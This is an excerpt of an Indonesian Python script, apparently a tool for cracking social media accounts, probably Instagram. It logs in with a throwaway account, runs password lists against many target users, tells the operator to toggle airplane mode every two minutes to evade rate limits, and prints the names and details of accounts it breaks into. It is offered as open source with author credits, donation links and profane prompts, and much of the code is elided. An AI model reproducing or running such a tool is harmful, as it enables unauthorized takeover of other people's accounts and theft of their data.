...
## Coded By Moch Arya Adinata (Najimi Ajimu)
## Follow Github Gua : https://github.com/Ruphas-Mafahl-XD
## FB : Facebook.com/AryaTrickers2020
## IG  : mizari.rhein
## YT : Muhammad Arya Adinata
## Donate : Saweria.co/AryaAdinata
##               : https://trakteer.id/aryaadinataxd/tip

## Thanks😁😆💮

## 100% Open Source Code
## If You Record/Copy Then Give the credits anjing :)
...
try:
	...
	exit(f'\n [\033[1;35m>\033[1;31m] Module {e} belum terinstall')
...
def cekAPI(cookie):
	...
	try:
		...
		print(f'{M}>{C} Login Sukses✓');sleep(4)
...
def login():
	global external
	try:
		print(f'\n{M}!{C} {H}Login Dulu Ngentot😠\n')
		us=input(f"{M}>{C} {H}Username :{C} ")
		pw=stdiomask.getpass(prompt=f'{M}>{C} {H}Password :{C}')
	except KeyboardInterrupt:
		exit(f'{H}>{C} {H}KeyboardInterrupt terdeteksi... keluar {M}!{C}')
	...
	if x.get('status')=='success':
		...
		print(f'\n{M}>{C} {H}Okaeri Onee-Chan Daisuki<3{C}')
		os.system('python login.py')
	elif x.get('status')=='checkpoint':
		exit(f'{M}>{C} {H}Akun Checkpoint,Silahkan Ganti Tumbal{C}')
	else:
		exit(f'{M}!{C} {H}MASUKKAN USERNAME DAN PASSWORD YANG BENAR ANJING 😠{C}')
...
[+] Author : Young blade
[+] Email : radeboyofficial@gmail.com
[+] Github : Github.com/young1112
[~] ----------------------------------------------
[+] Bergabung : 4 Februari 2004
[+] Status : Premium
[+] Expired : None
[~] ----------------------------------------------
...
[P] Logout
	...
	def BUG(self):
		os.system('clear')
		print(f"""Tunggu, sedang mengalihkan ke WhatsApp Author""")
		os.system('xdg-open https://wa.me/2347064638008?text=Bang+Aku+Mau+Donasi☕')
		print(f"""Makasi❤️""")
		exit()

	def Exit(self):
		x=input(f'\n [{M}>{C}] Yakin....mau keluar ? [Y/t]: ')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
 ...
 Note : Semakin banyak password yang
 digunakan, maka semakin banyak data
 yang dingunakan.
 ...
 [{M}!{C}] hidupkan mode pesawat  setiap 2 menit
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r [Arya❤️Ruphas][{K}{loop}/{len(internal)}{C}] {H}[LIVE :{len(success)}]{C}  {M}[FUCK :{len(checkpoint)}]{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
				...
				if "userId" in str(x_jason):
					...
					print(f"""\r {H}[>]{C} {H}Berhasil Login👨🏻‍💻
  {H}[>]{C} {H}NAMA: {H}{nama}{C}
  ...
  {M}[>]{C} Postingan: {M}{postingan}{C}
	...
	def menu(self):
		...
		if c=='':
			...
			print(f'\n [{U}+{C}] Total Result Hasil Crack {H}{len(g)}{C}')
